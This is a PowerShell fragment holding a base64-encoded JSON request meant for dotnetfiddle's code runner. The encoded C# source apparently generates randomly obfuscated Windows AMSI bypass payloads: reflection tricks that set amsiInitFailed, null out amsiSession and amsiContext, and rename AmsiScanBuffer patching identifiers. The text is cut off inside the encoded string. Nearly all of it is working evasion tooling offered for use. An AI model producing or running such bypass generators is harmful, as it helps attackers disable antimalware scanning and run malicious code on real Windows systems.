$destinationaddr = "https://dotnetfiddle.net/Home/Run"
$jsonpostrequestbase64 = "eyJDb2RlQmxvY2siOiJ1c2luZyBTeXN0ZW07XG51c2luZyBTeXN0ZW0uUnVudGltZTtcbnVzaW5nIFN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljO1xudXNpbmcgU3lzdGVtLkxpbnE7XG51c2luZyBTeXN0ZW0uVGV4dDtcbnVzaW5nIFN5c3RlbS5UZXh0LlJlZ3VsYXJFeHByZXNzaW9ucztcblxuXG5wdWJsaWMgY2xhc3MgR2VuZXJhdGVBTUJZXG57XG4gICAgcHJpdmF0ZSBzdGF0aWMgUmFuZG9tIHJhbmRvbSA9IG5ldyBSYW5kb20oKTtcblxuICAgIHB1YmxpYyBzdGF0aWMgaW50IFJhbmRvbU51bWJlcihpbnQgbWluLCBpbnQgbWF4KVxuICAgIHtcbiAgICAgICAgcmV0dXJuIHJhbmRvbS5OZXh0KG1pbiwgbWF4KTtcbiAgICB9XG4gICAgcHVibGljIHN0YXRpYyBzdHJpbmcgT2JmdUNoYXJCdXRlKGNoYXIgY2hhcmluKVxuICAgIHtcblxuICAgICAgICBpbnQgYXNjaWlJbnQgPSBDb252ZXJ0LlRvSW50MzIoY2hhcmluKTtcbiAgICAgICAgdmFyIGFzY2lpQnl0ZSA9IENvbnZlcnQuVG9CeXRlKGFzY2lpSW50KS5Ub1N0cmluZygmcXVvdDtYJnF1b3Q7KTtcbiAgICAgICAgcmV0dXJuICZxdW90O1smcXVvdDsgKyBSYW5kb21DYXNlKCZxdW90O0NIQVImcXVvdDspICsgJnF1b3Q7XVsmcXVvdDsgKyBSYW5kb21DYXNlKCZxdW90O0JZVEUmcXVvdDspICsgJnF1b3Q7XTB4JnF1b3Q7ICsgYXNjaWlCeXRlO1xuICAgIH1cbiAgICBwdWJsaWMgc3RhdGljIHN0cmluZyBSYW5kb21DYXNlKHN0cmluZyBpbnB1dClcbiAgICB7XG4gICAgICAgIHJldHVybiBuZXcgc3RyaW5nKChpbnB1dC5TZWxlY3QoeCA9Jmd0OyByYW5kb20uTmV4dCgpICUgMiA9PSAwID8gKGNoYXIuSXNVcHBlcih4KSA/IHguVG9TdHJpbmcoKS5Ub0xvd2VyKCkuRmlyc3QoKSA6IHguVG9TdHJpbmcoKS5Ub1VwcGVyKCkuRmlyc3QoKSkgOiB4KSkuVG9BcnJheSgpKTtcbiAgICB9XG5cblxuICAgIHB1YmxpYyBzdGF0aWMgc3RyaW5nIEJ5dGVFbmNvZGUoY2hhciBpbnB1dENoYXIpXG4gICAge1xuICAgICAgICAvL0dldCB0aGUgYXNjaWkgdmFsdWUgb2YgdGhlIGNoYXJcbiAgICAgICAgaW50IGFzY2lpVmFsdWUgPSBDb252ZXJ0LlRvSW50MzIoaW5wdXRDaGFyKTtcbiAgICAgICAgc3RyaW5nIHJhbmRvbWNhc2VvZkJ5dGUgPSBSYW5kb21DYXNlKCZxdW90O2J5dGUmcXVvdDspO1xuICAgICAgICBzdHJpbmcgYXNjaWlWYWx1ZU9mWCA9IENvbnZlcnQuVG9CeXRlKGFzY2lpVmFsdWUpLlRvU3RyaW5nKCZxdW90O1gmcXVvdDspO1xuXG4gICAgICAgIHN0cmluZyBvdXRwdXQgPSBTdHJpbmcuRm9ybWF0KCZxdW90OyhbezB9XTB4ezF9KSZxdW90OywgcmFuZG9tY2FzZW9mQnl0ZSwgYXNjaWlWYWx1ZU9mWCk7ICAvLyByZXR1cm4gJCZxdW90Oyhbe1JhbmRvbUNhc2UoJnF1b3Q7Ynl0ZSZxdW90Oyl9XTB4e0NvbnZlcnQuVG9CeXRlKGFzY2lpVmFsdWUpLlRvU3RyaW5nKCZxdW90O1gmcXVvdDspfSkmcXVvdDs7XG4gICAgICAgIHJldHVybiBvdXRwdXQ7XG4gICAgfVxuXG4gICAgcHVibGljIHN0YXRpYyBzdHJpbmcgRGlhY3JpdGljRW5jb2RlKHN0cmluZyBpbnB1dENoYXIpXG4gICAge1xuICAgICAgICBzdHJpbmcgY2hhckJ1aWxkZXIgPSAmcXVvdDsmcXVvdDs7XG4gICAgICAgIGZvcmVhY2ggKHZhciBfY2hhciBpbiBpbnB1dENoYXIpXG4gICAgICAgIHtcbiAgICAgICAgICAgIGNoYXJCdWlsZGVyICs9IEdldFJhbmRvbURpYWNyaXRpYyhDb252ZXJ0LlRvSW50MzIoX2NoYXIpKTtcbiAgICAgICAgfVxuICAgICAgICByZXR1cm4gY2hhckJ1aWxkZXI7XG5cbiAgICB9XG5cbiAgICBwcml2YXRlIHN0YXRpYyBzdHJpbmcgR2V0UmFuZG9tRGlhY3JpdGljKGludCBhc2NpaVZhbHVlKVxuICAgIHtcbiAgICAgICAgc3dpdGNoIChhc2NpaVZhbHVlKVxuICAgICAgICB7XG4gICAgICAgICAgICBjYXNlIDY1OiAgIC8vQVxuICAgICAgICAgICAgICAgIHJldHVybiBDb252ZXJ0LlRvQ2hhcihSYW5kb21OdW1iZXIoMTkyLCAxOTcpKS5Ub1N0cmluZygpO1xuICAgICAgICAgICAgY2FzZSA5NzogIC8vYVxuICAgICAgICAgICAgICAgIHJldHVybiBDb252ZXJ0LlRvQ2hhcihSYW5kb21OdW1iZXIoMjI0LCAyMjkpKS5Ub1N0cmluZygpO1xuICAgICAgICAgICAgY2FzZSA3MzogIC8vSVxuICAgICAgICAgICAgICAgIHJldHVybiBDb252ZXJ0LlRvQ2hhcihSYW5kb21OdW1iZXIoMjA0LCAyMDcpKS5Ub1N0cmluZygpO1xuICAgICAgICAgICAgY2FzZSAxMDU6ICAvL2lcbiAgICAgICAgICAgICAgICByZXR1cm4gQ29udmVydC5Ub0NoYXIoUmFuZG9tTnVtYmVyKDIzNiwgMjM5KSkuVG9TdHJpbmcoKTtcbiAgICAgICAgICAgIGNhc2UgNzk6ICAvL09cbiAgICAgICAgICAgICAgICByZXR1cm4gQ29udmVydC5Ub0NoYXIoUmFuZG9tTnVtYmVyKDIxMCwgMjE2KSkuVG9TdHJpbmcoKTtcbiAgICAgICAgICAgIGNhc2UgNjk6IC8vRVxuICAgICAgICAgICAgICAgIHJldHVybiBDb252ZXJ0LlRvQ2hhcihSYW5kb21OdW1iZXIoMjM2LCAyMzkpKS5Ub1N0cmluZygpO1xuICAgICAgICAgICAgY2FzZSAxMTE6IC8vb1xuICAgICAgICAgICAgICAgIHJldHVybiBDb252ZXJ0LlRvQ2hhcihSYW5kb21OdW1iZXIoMjQzLCAyNDYpKS5Ub1N0cmluZygpO1xuICAgICAgICAgICAgZGVmYXVsdDpcbiAgICAgICAgICAgICAgICByZXR1cm4gQ29udmVydC5Ub0NoYXIoYXNjaWlWYWx1ZSkuVG9TdHJpbmcoKTtcbiAgICAgICAgfVxuXG5cbiAgICB9XG5cbiAgICBwdWJsaWMgc3RhdGljIHN0cmluZyBIVE1MRW5jb2RlKHN0cmluZyBpbnB1dENoYXIpXG4gICAge1xuICAgICAgICB2YXIgY2hhckJ1aWxkZXIgPSAmcXVvdDsmcXVvdDs7XG4gICAgICAgIGZvcmVhY2ggKHZhciBfY2hhciBpbiBpbnB1dENoYXIpXG4gICAgICAgIHtcbiAgICAgICAgICAgIGNoYXJCdWlsZGVyICs9IFN0cmluZy5Gb3JtYXQoJnF1b3Q7JmFtcDsjJnF1b3Q7ICsgQ29udmVydC5Ub0ludDMyKF9jaGFyKSArICZxdW90OzsmcXVvdDspOyAvLyBpZGsgd2h5IHRoaXMgZ3V5IHVzZXMgaW50ZXJwb2xhdGVkIHN0cmluZyBvbiBoZXJlXG4gICAgICAgIH1cbiAgICAgICAgcmV0dXJuIGNoYXJCdWlsZGVyO1xuXG4gICAgfVxuXG4gICAgcHVibGljIHN0YXRpYyBzdHJpbmcgQ2hhckVuY29kZShjaGFyIGlucHV0Q2hhcilcbiAgICB7XG4gICAgICAgIC8vR2V0IHRoZSBhc2NpaSB2YWx1ZSBvZiB0aGUgY2hhclxuICAgICAgICBpbnQgYXNjaWlWYWx1ZSA9IENvbnZlcnQuVG9JbnQzMihpbnB1dENoYXIpO1xuXG4gICAgICAgIC8vT2JmdXNjYXRlIHRoZSBpbnQgdmFsdWVcbiAgICAgICAgcmV0dXJuIE9iZnVzY2F0ZUludChhc2NpaVZhbHVlKS5Ub1N0cmluZygpO1xuXG4gICAgfVxuXG4gICAgcHVibGljIHN0YXRpYyBzdHJpbmcgT2JmdXNjYXRlQ2hhcihjaGFyIGNoYXJJbnB1dCwgc3RyaW5nIHN0YXJ0Q2hhciA9ICZxdW90OysmcXVvdDspXG4gICAge1xuXG4gICAgICAgIC8vU2VsZWN0IGEgcmFuZG9tIGVuY29kaW5nIG1ldGhvZCBmb3IgYSBzaW5nbGUgY2hhclxuICAgICAgICBzd2l0Y2ggKFJhbmRvbU51bWJlcigxLCAzKSlcbiAgICAgICAge1xuICAgICAgICAgICAgY2FzZSAxOlxuICAgICAgICAgICAgICAgIHJldHVybiBzdGFydENoYXIgKyAmcXVvdDtbJnF1b3Q7ICsgUmFuZG9tQ2FzZSgmcXVvdDtDSEFSJnF1b3Q7KSArICZxdW90O10mcXVvdDsgKyBCeXRlRW5jb2RlKGNoYXJJbnB1dCk7XG4gICAgICAgICAgICBjYXNlIDI6XG4gICAgICAgICAgICAgICAgcmV0dXJuIHN0YXJ0Q2hhciArICZxdW90O1smcXVvdDsgKyBSYW5kb21DYXNlKCZxdW90O0NIQVImcXVvdDspICsgJnF1b3Q7XSZxdW90OyArIENoYXJFbmNvZGUoY2hhcklucHV0KTtcbiAgICAgICAgICAgIGRlZmF1bHQ6XG4gICAgICAgICAgICAgICAgcmV0dXJuIHN0YXJ0Q2hhciArICZxdW90O1smcXVvdDsgKyBSYW5kb21DYXNlKCZxdW90O0NIQVImcXVvdDspICsgJnF1b3Q7XSZxdW90OyArIENoYXJFbmNvZGUoY2hhcklucHV0KTtcbiAgICAgICAgfVxuXG4gICAgfVxuXG4gICAgcHVibGljIHN0YXRpYyBzdHJpbmcgT2JmdXNjYXRlSW50KGludCBhc2NpaUludClcbiAgICB7XG4gICAgICAgIHZhciBzdWJOdW1iZXIgPSBSYW5kb21OdW1iZXIoYXNjaWlJbnQgLSBhc2NpaUludCArIDEsIChhc2NpaUludCAtIDIpKTtcblxuICAgICAgICBzd2l0Y2ggKFJhbmRvbU51bWJlcigxLCA1KSlcbiAgICAgICAge1xuICAgICAgICAgICAgY2FzZSAxOlxuICAgICAgICAgICAgICAgIHN0cmluZyBvdXRwdXQxID0gU3RyaW5nLkZvcm1hdCgmcXVvdDsoezB9K3sxfSkmcXVvdDssIHN1Yk51bWJlciwgKGFzY2lpSW50IC0gc3ViTnVtYmVyKSk7XG4gICAgICAgICAgICAgICAgcmV0dXJuIG91dHB1dDE7Ly8gcmV0dXJuICQmcXVvdDsoe3N1Yk51bWJlcn0re2FzY2lpSW50IC0gc3ViTnVtYmVyfSkmcXVvdDs7XG4gICAgICAgICAgICBjYXNlIDI6XG4gICAgICAgICAgICAgICAgc3RyaW5nIG91dHB1dDIgPSBTdHJpbmcuRm9ybWF0KCZxdW90Oyh7MH0tezF9KSZxdW90OywgKGFzY2lpSW50ICsgc3ViTnVtYmVyKSwgc3ViTnVtYmVyKTtcbiAgICAgICAgICAgICAgICByZXR1cm4gb3V0cHV0MjsvLyByZXR1cm4gJCZxdW90Oyh7YXNjaWlJbnQgKyBzdWJOdW1iZXJ9LXtzdWJOdW1iZXJ9KSZxdW90OztcbiAgICAgICAgICAgIGNhc2UgMzpcbiAgICAgICAgICAgICAgICBzdHJpbmcgb3V0cHV0MyA9IFN0cmluZy5Gb3JtYXQoJnF1b3Q7KHswfS97MX0pJnF1b3Q7LCAoYXNjaWlJbnQgKiBzdWJOdW1iZXIpLCBzdWJOdW1iZXIpO1xuICAgICAgICAgICAgICAgIHJldHVybiBvdXRwdXQzOy8vIHJldHVybiAkJnF1b3Q7KHthc2NpaUludCAqIHN1Yk51bWJlcn0ve3N1Yk51bWJlcn0pJnF1b3Q7O1xuICAgICAgICAgICAgY2FzZSA0OlxuICAgICAgICAgICAgICAgIHN0cmluZyBvdXRwdXQ0ID0gU3RyaW5nLkZvcm1hdCgmcXVvdDsoezB9KSZxdW90OywgYXNjaWlJbnQpO1xuICAgICAgICAgICAgICAgIHJldHVybiBvdXRwdXQ0Oy8vIHJldHVybiAkJnF1b3Q7KHthc2NpaUludH0pJnF1b3Q7O1xuICAgICAgICAgICAgZGVmYXVsdDpcbiAgICAgICAgICAgICAgICBzdHJpbmcgb3V0cHV0NSA9IFN0cmluZy5Gb3JtYXQoJnF1b3Q7KHswfS97MX0pJnF1b3Q7LCAoYXNjaWlJbnQgKiBzdWJOdW1iZXIpLCBzdWJOdW1iZXIpO1xuICAgICAgICAgICAgICAgIHJldHVybiBvdXRwdXQ1Oy8vIHJldHVybiAkJnF1b3Q7KHthc2NpaUludCAqIHN1Yk51bWJlcn0ve3N1Yk51bWJlcn0pJnF1b3Q7O1xuICAgICAgICB9XG4gICAgfVxuXG4gICAgcHVibGljIHN0YXRpYyBzdHJpbmcgT2JmdXNjYXRlU3RyaW5nKHN0cmluZyBkYXRhLCBpbnQgbWF4Q2FzZSA9IDMpXG4gICAge1xuICAgICAgICBzdHJpbmcgb2JmdXNjYXRlZFN0cmluZyA9ICZxdW90OyZxdW90OztcbiAgICAgICAgc3dpdGNoIChSYW5kb21OdW1iZXIoMSwgbWF4Q2FzZSkpXG4gICAgICAgIHtcbiAgICAgICAgICAgIGNhc2UgMTpcbiAgICAgICAgICAgICAgICBmb3JlYWNoIChjaGFyIF9jaGFyIGluIGRhdGEpXG4gICAgICAgICAgICAgICAge1xuICAgICAgICAgICAgICAgICAgICBvYmZ1c2NhdGVkU3RyaW5nICs9IE9iZnVzY2F0ZUNoYXIoX2NoYXIpO1xuICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICByZXR1cm4gb2JmdXNjYXRlZFN0cmluZztcbiAgICAgICAgICAgIGNhc2UgMjpcbiAgICAgICAgICAgICAgICBzdHJpbmcgb2JmdXNjYXRlZEZvcm1EID0gJnF1b3Q7JnF1b3Q7O1xuICAgICAgICAgICAgICAgIHN0cmluZyBvYmZ1c2NhdGVkUGF0dGVybiA9ICZxdW90OyZxdW90OztcblxuICAgICAgICAgICAgICAgIGZvcmVhY2ggKGNoYXIgX2NoYXIgaW4gJnF1b3Q7Rm9ybUQmcXVvdDspXG4gICAgICAgICAgICAgICAge1xuICAgICAgICAgICAgICAgICAgICBvYmZ1c2NhdGVkRm9ybUQgKz0gT2JmdXNjYXRlQ2hhcihfY2hhcik7XG4gICAgICAgICAgICAgICAgfVxuXG4gICAgICAgICAgICAgICAgZm9yZWFjaCAoY2hhciBfY2hhciBpbiBAJnF1b3Q7XFxwe01ufSZxdW90OylcbiAgICAgICAgICAgICAgICB7XG4gICAgICAgICAgICAgICAgICAgIG9iZnVzY2F0ZWRQYXR0ZXJuICs9IE9iZnVzY2F0ZUNoYXIoX2NoYXIpO1xuICAgICAgICAgICAgICAgIH1cblxuICAgICAgICAgICAgICAgIHN0cmluZyBvdXRwdXQ2ID0gU3RyaW5nLkZvcm1hdCgmcXVvdDsrJiN4Mjc7ezB9JiN4Mjc7LiZxdW90OywgKERpYWNyaXRpY0VuY29kZShkYXRhKSkpO1xuICAgICAgICAgICAgICAgIHJldHVybiBvdXRwdXQ2ICsgUmFuZG9tQ2FzZSgmcXVvdDtOb3JtYWxpemUmcXVvdDspICsgJnF1b3Q7KCZxdW90OyArIG9iZnVzY2F0ZWRGb3JtRC5SZW1vdmUoMCwgMSkgKyAmcXVvdDspIC1yZXBsYWNlICZxdW90OyArIG9iZnVzY2F0ZWRQYXR0ZXJuLlJlbW92ZSgwLCAxKTtcbiAgICAgICAgICAgIGRlZmF1bHQ6XG4gICAgICAgICAgICAgICAgcmV0dXJuICZxdW90OyZxdW90OztcbiAgICAgICAgfVxuICAgIH1cblxuICAgIHB1YmxpYyBzdGF0aWMgc3RyaW5nIFJhbmRvbVN0cmluZyhpbnQgc2l6ZSwgYm9vbCBsb3dlckNhc2UgPSBmYWxzZSlcbiAgICB7XG4gICAgICAgIHZhciBidWlsZGVyID0gbmV3IFN0cmluZ0J1aWxkZXIoc2l6ZSk7XG4gICAgICAgIGNoYXIgb2Zmc2V0ID0gbG93ZXJDYXNlID8gJiN4Mjc7YSYjeDI3OyA6ICYjeDI3O0EmI3gyNzs7XG4gICAgICAgIGNvbnN0IGludCBsZXR0ZXJzT2Zmc2V0ID0gMjY7XG5cbiAgICAgICAgZm9yICh2YXIgaSA9IDA7IGkgJmx0OyBzaXplOyBpKyspXG4gICAgICAgIHtcbiAgICAgICAgICAgIHZhciBAY2hhciA9IChjaGFyKXJhbmRvbS5OZXh0KG9mZnNldCwgb2Zmc2V0ICsgbGV0dGVyc09mZnNldCk7XG4gICAgICAgICAgICBidWlsZGVyLkFwcGVuZChAY2hhcik7XG4gICAgICAgIH1cbiAgICAgICAgcmV0dXJuIGxvd2VyQ2FzZSA/IGJ1aWxkZXIuVG9TdHJpbmcoKS5Ub0xvd2VyKCkgOiBidWlsZGVyLlRvU3RyaW5nKCk7XG4gICAgfVxuXG4gICAgcHVibGljIHN0YXRpYyBzdHJpbmcgZW5jb2RlUGF5bG9hZChzdHJpbmcgZXhhbXBsZVBheWxvYWRzLCBib29sIGRvdWJsZVF1dGVzID0gZmFsc2UpXG4gICAge1xuICAgICAgICAvL1JlZ2V4IHRvIHB1bGwgb3V0IGFsbCBzdHJpbmdzIGluc2lkZSAmI3gyNzsqJiN4Mjc7IHRhZ3NcbiAgICAgICAgUmVnZXggcmdTdHJpbmdSdWxlID0gbmV3IFJlZ2V4KEAmcXVvdDtcXCYjeDI3OyguKj8pXFwmI3gyNzsmcXVvdDssIFJlZ2V4T3B0aW9ucy5Db21waWxlZCB8IFJlZ2V4T3B0aW9ucy5JZ25vcmVDYXNlKTtcblxuICAgICAgICAvL1B1bGwgYWxsIGFsbCByZXN1bHRzIHRoYXQgYXJlIG5vdCBlbXB0eVxuICAgICAgICBMaXN0Jmx0O3N0cmluZyZndDsgbWF0Y2hlZFN0cmluZ3MgPSAocmdTdHJpbmdSdWxlLk1hdGNoZXMoZXhhbXBsZVBheWxvYWRzKSkuQ2FzdCZsdDtNYXRjaCZndDsoKS5XaGVyZSh4ID0mZ3Q7ICFzdHJpbmcuSXNOdWxsT3JFbXB0eSh4LlZhbHVlKSkuU2VsZWN0KHggPSZndDsgeC5WYWx1ZSkuVG9MaXN0KCk7XG5cbiAgICAgICAgLy9pZiB0aGVyZSBpcyBhbnkgcmVzdWx0c1xuICAgICAgICBpZiAobWF0Y2hlZFN0cmluZ3MuQ291bnQoKSAmZ3Q7IDApXG4gICAgICAgIHtcbiAgICAgICAgICAgIC8vUGljayBPTkUgb2YgdGhlbSBhdCByYW5kb21cbiAgICAgICAgICAgIHN0cmluZyByYW5kb21TdHJpbmcgPSBtYXRjaGVkU3RyaW5nc1tSYW5kb21OdW1iZXIoMCwgbWF0Y2hlZFN0cmluZ3MuQ291bnQoKSldO1xuXG4gICAgICAgICAgICAvL09iZnVzY2F0ZSB0aGUgd2hvbGUgc3RyaW5nXG4gICAgICAgICAgICBzdHJpbmcgcmFuZG9tT2JmdXNjYXRlZFN0cmluZyA9IE9iZnVzY2F0ZVN0cmluZyhyYW5kb21TdHJpbmcuUmVwbGFjZSgmcXVvdDsmI3gyNzsmcXVvdDssICZxdW90OyZxdW90OykpLlRyaW1TdGFydChuZXdbXSB7JiN4Mjc7KyYjeDI3O30pO1xuXG4gICAgICAgICAgICAvL1JlcGxhY2VcbiAgICAgICAgICAgIGV4YW1wbGVQYXlsb2FkcyA9IGV4YW1wbGVQYXlsb2Fkcy5SZXBsYWNlKHJhbmRvbVN0cmluZywgJnF1b3Q7JCgmcXVvdDsgKyByYW5kb21PYmZ1c2NhdGVkU3RyaW5nICsgJnF1b3Q7KSZxdW90Oyk7XG4gICAgICAgIH1cblxuXG4gICAgICAgIC8vV2lsbCBhZGQgbW9yZSBrZXkgd29yZHMgaGVyZVxuICAgICAgICB2YXIgbXVzdEVuY29kZURpY3QgPSBuZXcgRGljdGlvbmFyeSZsdDtzdHJpbmcsIGR5bmFtaWMmZ3Q7KCk7XG5cbiAgICAgICAgLy9GaW5kIGEgd2F5IGZvciB0aGUga2V5d29yZHMgdG8gZGV0ZXJtZW5lIGlmIHRoZWlyIHdpdGhpbiBzaW5nbGUgb3IgZG91YmxlIFEmI3gyNztzXG4gICAgICAgIC8vUmUtYWRkIGh0bWxlbmNvZGVcbiAgICAgICAgLy9cblxuICAgICAgICBtdXN0RW5jb2RlRGljdC5BZGQoJnF1b3Q7YW1zaUNvbnRleHQmcXVvdDssIG5ld3sgZG91YmxlUSA9IHRydWUsIG1heEVuYyA9IDMgfSk7XG4gICAgICAgIG11c3RFbmNvZGVEaWN0LkFkZCgmcXVvdDthbXNpU2Vzc2lvbiZxdW90OywgbmV3eyBkb3VibGVRID0gdHJ1ZSwgbWF4RW5jID0gMyB9KTtcbiAgICAgICAgbXVzdEVuY29kZURpY3QuQWRkKCZxdW90O0Ftc2lVdGlscyZxdW90OywgbmV3eyBkb3VibGVRID0gdHJ1ZSwgbWF4RW5jID0gMyB9KTtcblxuICAgICAgICBtdXN0RW5jb2RlRGljdC5BZGQoJnF1b3Q7YW1zaUluaXRGYWlsZWQmcXVvdDssIG5ld3sgZG91YmxlUSA9IGZhbHNlLCBtYXhFbmMgPSAzIH0pO1xuXG4gICAgICAgIG11c3RFbmNvZGVEaWN0LkFkZCgmcXVvdDtXcml0ZUludDMyJnF1b3Q7LCBuZXd7IGRvdWJsZVEgPSB0cnVlLCBtYXhFbmMgPSAzIH0pO1xuICAgICAgICAvKlxuICAgICAgICB2YXIgbXVzdEVuY29kZURpY3QgPSBuZXcgRGljdGlvbmFyeSZsdDtzdHJpbmcsIGR5bmFtaWMmZ3Q7KCk7IFxuICAgICAgICBtdXN0RW5jb2RlRGljdC5BZGQoJnF1b3Q7dGVzdDEmcXVvdDssIG5ld3sgZG91YmxlUSA9IHRydWUsIG1heEVuYyA9IDMgfSk7IFxuICAgICAgICBDb25zb2xlLldyaXRlTGluZShtdXN0RW5jb2RlRGljdFsmcXVvdDt0ZXN0MSZxdW90O10uZG91YmxlUSk7XG4gICAgICAgICovXG5cblxuICAgICAgICBmb3JlYWNoICh2YXIgd29yZCBpbiBtdXN0RW5jb2RlRGljdClcbiAgICAgICAge1xuICAgICAgICAgICAgc3RyaW5nIG9iZnVzY2F0ZWRTdHJpbmcgPSBPYmZ1c2NhdGVTdHJpbmcod29yZC5LZXksIHdvcmQuVmFsdWUubWF4RW5jKTtcblxuICAgICAgICAgICAgaWYgKHdvcmQuVmFsdWUuZG91YmxlUSlcbiAgICAgICAgICAgICAgICBvYmZ1c2NhdGVkU3RyaW5nID0gJnF1b3Q7JCgmcXVvdDsgKyBvYmZ1c2NhdGVkU3RyaW5nLlRyaW1TdGFydChuZXdbXSB7JiN4Mjc7KyYjeDI3O30pICsgJnF1b3Q7KSZxdW90OztcbiAgICAgICAgICAgIGVsc2VcbiAgICAgICAgICAgICAgICBvYmZ1c2NhdGVkU3RyaW5nID0gJnF1b3Q7JiN4Mjc7KyQoJnF1b3Q7ICsgb2JmdXNjYXRlZFN0cmluZy5UcmltU3RhcnQobmV3W10geyYjeDI3OysmI3gyNzt9KSArICZxdW90OykrJiN4Mjc7JnF1b3Q7O1xuXG4gICAgICAgICAgICBleGFtcGxlUGF5bG9hZHMgPSBleGFtcGxlUGF5bG9hZHMuUmVwbGFjZSh3b3JkLktleSwgb2JmdXNjYXRlZFN0cmluZyk7XG4gICAgICAgIH1cblxuICAgICAgICByZXR1cm4gZXhhbXBsZVBheWxvYWRzO1xuXG4gICAgfVxuXG4gICAgcHVibGljIHN0YXRpYyBzdHJpbmcgZW5jb2RlcmFzdGEoc3RyaW5nIGV4YW1wbGVQYXlsb2FkcylcbiAgICB7XG4gICAgICAgIHZhciBtdXN0RW5jb2RlID0gbmV3IHN0cmluZ1tdIHsgJnF1b3Q7QW1zaVNjYW5CdWZmZXImcXVvdDssICZxdW90O2Ftc2kuZGxsJnF1b3Q7IH07XG5cbiAgICAgICAgdmFyIHZhcnNUb0VuY29kZSA9IG5ldyBzdHJpbmdbXSB7ICZxdW90O0xvYWRMaWJyYXJ5JnF1b3Q7LCAmcXVvdDtHZXRQcm9jQWRkcmVzcyZxdW90OywgJnF1b3Q7VmlydHVhbFByb3RlY3QmcXVvdDssICZxdW90O0NhbGxBU0JCQVBJJnF1b3Q7LCAmcXVvdDtBU0JCQVBJJnF1b3Q7LCAmcXVvdDtMaWJMb2FkJnF1b3Q7LCAmcXVvdDtNZW1BZHImcXVvdDssICZxdW90O1BhdGNoJnF1b3Q7LCAmcXVvdDt2YXIxJnF1b3Q7LCAmcXVvdDt2YXIyJnF1b3Q7LCAmcXVvdDt2YXIzJnF1b3Q7LCAmcXVvdDt2YXI0JnF1b3Q7LCAmcXVvdDt2YXI1JnF1b3Q7LCAmcXVvdDt2YXI2JnF1b3Q7IH07XG5cbiAgICAgICAgLy9NYXliZSByZWxldmFudCBsYXRlciBvblxuICAgICAgICAvL3ZhciBwYXRjaEJ5dGVzID0gbmV3IHN0cmluZ1tdIHsgJnF1b3Q7QjgmcXVvdDssICZxdW90OzU3JnF1b3Q7LCAmcXVvdDswMCZxdW90OywgJnF1b3Q7MDcmcXVvdDssICZxdW90OzgwJnF1b3Q7LCAmcXVvdDtDMyZxdW90OyB9O1xuXG4gICAgICAgIGZvcmVhY2ggKHZhciB3b3JkIGluIHZhcnNUb0VuY29kZSlcbiAgICAgICAge1xuICAgICAgICAgICAgdmFyIG5ld29yZCA9IFJhbmRvbVN0cmluZyh3b3JkLkxlbmd0aCk7XG5cbiAgICAgICAgICAgIGV4YW1wbGVQYXlsb2FkcyA9IGV4YW1wbGVQYXlsb2Fkcy5SZXBsYWNlKHdvcmQsIG5ld29yZCk7XG4gICAgICAgIH1cblxuICAgICAgICBmb3JlYWNoICh2YXIgd29yZCBpbiBtdXN0RW5jb2RlKVxuICAgICAgICB7XG4gICAgICAgICAgICBzdHJpbmcgb2JmdXNjYXRlZFN0cmluZyA9IE9iZnVzY2F0ZVN0cmluZyh3b3JkKTtcblxuICAgICAgICAgICAgb2JmdXNjYXRlZFN0cmluZyA9ICZxdW90OyQoJnF1b3Q7ICsgb2JmdXNjYXRlZFN0cmluZy5UcmltU3RhcnQobmV3W10geyYjeDI3OysmI3gyNzt9KSArICZxdW90OykmcXVvdDs7XG5cbiAgICAgICAgICAgIGV4YW1wbGVQYXlsb2FkcyA9IGV4YW1wbGVQYXlsb2Fkcy5SZXBsYWNlKHdvcmQsIG9iZnVzY2F0ZWRTdHJpbmcpO1xuICAgICAgICB9XG5cbiAgICAgICAgcmV0dXJuIGV4YW1wbGVQYXlsb2FkcztcblxuICAgIH1cbiAgICBwdWJsaWMgc3RhdGljIHN0cmluZyBHZW5lcmF0ZSgpXG4gICAge1xuICAgICAgICAvL1Vua25vd24gLUZvcmNlIGVycm9yXG4gICAgICAgIHZhciBtZW1WYXIgPSBSYW5kb21TdHJpbmcoUmFuZG9tTnVtYmVyKDMsIDEwKSk7XG4gICAgICAgIHZhciBGb3JjZUVycmVyID0gJnF1b3Q7I1Vua25vd24gLSBGb3JjZSBlcnJvciBcXG4kJnF1b3Q7ICsgbWVtVmFyICsgJnF1b3Q7PVtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkFsbG9jSEdsb2JhbCgmcXVvdDsgKyBPYmZ1c2NhdGVJbnQoOTA3NikgKyAmcXVvdDspO1tSZWZdLkFzc2VtYmx5LkdldFR5cGUoXFwmcXVvdDtTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLkFtc2lVdGlsc1xcJnF1b3Q7KS5HZXRGaWVsZChcXCZxdW90O2Ftc2lTZXNzaW9uXFwmcXVvdDssIFxcJnF1b3Q7Tm9uUHVibGljLFN0YXRpY1xcJnF1b3Q7KS5TZXRWYWx1ZSgkbnVsbCwgJG51bGwpO1tSZWZdLkFzc2VtYmx5LkdldFR5cGUoXFwmcXVvdDtTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLkFtc2lVdGlsc1xcJnF1b3Q7KS5HZXRGaWVsZChcXCZxdW90O2Ftc2lDb250ZXh0XFwmcXVvdDssIFxcJnF1b3Q7Tm9uUHVibGljLFN0YXRpY1xcJnF1b3Q7KS5TZXRWYWx1ZSgkbnVsbCwgW0ludFB0cl0kJnF1b3Q7ICsgbWVtVmFyICsgJnF1b3Q7KTsmcXVvdDs7XG5cbiAgICAgICAgLy8gVXNpbmcgTWF0dCBHcmFlYmVycyBSZWZsZWN0aW9uIG1ldGhvZFxuICAgICAgICB2YXIgTWF0dEdSZWZsID0gJnF1b3Q7I01hdHQgR3JhZWJlcnMgUmVmbGVjdGlvbiBtZXRob2QgXFxuW1JlZl0uQXNzZW1ibHkuR2V0VHlwZShcXCZxdW90O1N5c3RlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb24uQW1zaVV0aWxzXFwmcXVvdDspLkdldEZpZWxkKCYjeDI3O2Ftc2lJbml0RmFpbGVkJiN4Mjc7LFxcJnF1b3Q7Tm9uUHVibGljLFN0YXRpY1xcJnF1b3Q7KS5TZXRWYWx1ZSgkbnVsbCwkdHJ1ZSk7JnF1b3Q7O1xuXG4gICAgICAgIC8vVXNpbmcgTWF0dCBHcmFlYmVycyBSZWZsZWN0aW9uIG1ldGhvZCB3aXRoIFdNRjUgYXV0b2xvZ2dpbmcgYnlwYXNzXG4gICAgICAgIHZhciBNYXR0R1JlZmxMb2cgPSAmc